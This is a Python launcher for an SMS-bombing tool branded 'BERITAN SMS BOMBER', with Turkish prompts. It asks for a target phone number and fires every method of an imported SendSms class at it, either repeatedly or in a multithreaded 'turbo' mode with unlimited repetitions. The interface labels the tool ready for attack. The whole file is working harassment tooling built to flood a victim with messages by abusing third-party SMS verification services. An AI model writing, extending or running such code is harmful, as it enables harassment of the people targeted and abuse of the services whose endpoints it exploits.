from colorama import Fore, Style, init
from time import sleep
from os import system
import threading
from sms import SendSms

# Renklerin terminalde otomatik sıfırlanması
init(autoreset=True)

def banner():
    system("clear")
    # PROFESYONEL PIXEL ART HACKER LOGOSU & BERITAN SMS BOMBER
    print(f"""{Fore.LIGHTRED_EX}
          .mMMMMMMMMMMMMMMm.
        mMMMMMMMMMMMMMMMMMMMMm
      mMMMMMMMMMMMMMMMMMMMMMMMMm
     MMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM     {Fore.WHITE}BERITAN SMS BOMBER{Fore.LIGHTRED_EX}
    MMMMMM    MMMMMMMM    MMMMMMMM     {Fore.WHITE}------------------{Fore.LIGHTRED_EX}
    MMMMMM    MMMMMMMM    MMMMMMMM     {Fore.WHITE}Version: 3.1 Pro{Fore.LIGHTRED_EX}
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM     {Fore.WHITE}System: Kali Linux{Fore.LIGHTRED_EX}
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
      MMMMMMMMMMMMMMMMMMMMMMMMMM
        MMMMMM  MMMMMM  MMMMMM
          MMMM  MMMMMM  MMMM
    
    {Fore.CYAN}██████╗ ███████╗██████╗ ██╗████████╗ █████╗ ███╗   ██╗
    {Fore.CYAN}██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝██╔══██╗████╗  ██║
    {Fore.CYAN}██████╔╝█████╗  ██████╔╝██║   ██║   ███████║██╔██╗ ██║
    {Fore.CYAN}██╔══██╗██╔══╝  ██╔══██╗██║   ██║   ██╔══██║██║╚██╗██║
    {Fore.CYAN}██████╔╝███████╗██║  ██║██║   ██║   ██║  ██║██║ ╚████║
    {Fore.CYAN}╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝

    {Fore.WHITE}┌────────────────────────────────────────────────────────┐
    {Fore.LIGHTYELLOW_EX}│  {Fore.WHITE}Developer: {Fore.LIGHTRED_EX}BERITAN       {Fore.WHITE}Instagram: {Fore.LIGHTCYAN_EX}@tingirifistik  {Fore.LIGHTYELLOW_EX}│
    {Fore.WHITE}└────────────────────────────────────────────────────────┘
    """)

# Servisleri listele
servisler_sms = [f for f in dir(SendSms) if callable(getattr(SendSms, f)) and not f.startswith("__") and f not in ["log"]]

while True:
    banner()
    print(f"{Fore.LIGHTCYAN_EX}[*] Aktif Servis: {Fore.WHITE}{len(servisler_sms)} {Fore.LIGHTCYAN_EX}| Durum: {Fore.LIGHTGREEN_EX}Saldırıya Hazır\n")
    
    print(f"{Fore.LIGHTMAGENTA_EX} [1] {Fore.WHITE}Normal Mod")
    print(f"{Fore.LIGHTMAGENTA_EX} [2] {Fore.WHITE}TURBO MOD (Önerilen)")
    print(f"{Fore.LIGHTMAGENTA_EX} [3] {Fore.WHITE}Güvenli Çıkış\n")
    
    secim = input(f"{Fore.LIGHTYELLOW_EX}Sistem Seçimi >> {Fore.WHITE}")
    
    if secim == "3":
        print(f"\n{Fore.LIGHTRED_EX}[!] Terminal bağlantısı kesiliyor...")
        sleep(1)
        break
        
    if secim in ["1", "2"]:
        tel_no = input(f"\n{Fore.LIGHTCYAN_EX}Hedef No (Örn: 5XXXXXXXXX): {Fore.WHITE}")
        if len(tel_no) != 10:
            print(f"{Fore.LIGHTRED_EX}\n[-] Geçersiz numara! 10 haneli yazın.")
            sleep(2)
            continue
            
        kere = input(f"{Fore.LIGHTCYAN_EX}Miktar (Sonsuz için Enter): {Fore.WHITE}")
        kere = int(kere) if kere else None
        
        aralik = input(f"{Fore.LIGHTCYAN_EX}Gecikme/Saniye (Örn: 0): {Fore.WHITE}")
        aralik = int(aralik) if aralik else 0
        
        sms_obj = SendSms(tel_no, "")
        
        if secim == "1":
            print(f"\n{Fore.LIGHTYELLOW_EX}[+] İşlem Başlatıldı... (Durdurmak için: CTRL+C)")
            try:
                while kere is None or sms_obj.adet < kere:
                    for servis in servisler_sms:
                        if kere and sms_obj.adet >= kere: break
                        getattr(sms_obj, servis)()
                        if aralik > 0: sleep(aralik)
            except KeyboardInterrupt:
                print(f"\n{Fore.LIGHTRED_EX}[!] İşlem yarıda kesildi.")
                sleep(2)
            
        elif secim == "2":
            print(f"\n{Fore.LIGHTRED_EX}[!!!] TURBO SALDIRI BAŞLADI!")
            print(f"{Fore.WHITE}Menüye dönmek için ENTER tuşuna basılı tutun...\n")
            
            stop_event = threading.Event()

            def turbo_worker():
                while not stop_event.is_set():
                    threads = []
                    for servis in servisler_sms:
                        if stop_event.is_set(): break
                        t = threading.Thread(target=getattr(sms_obj, servis))
                        threads.append(t)
                        t.start()
                    for t in threads: t.join()
            
            t_thread = threading.Thread(target=turbo_worker, daemon=True)
            t_thread.start()
            input("") 
            stop_event.set()
            print(f"{Fore.LIGHTYELLOW_EX}[*] Temizleniyor...")
            sleep(1.5)
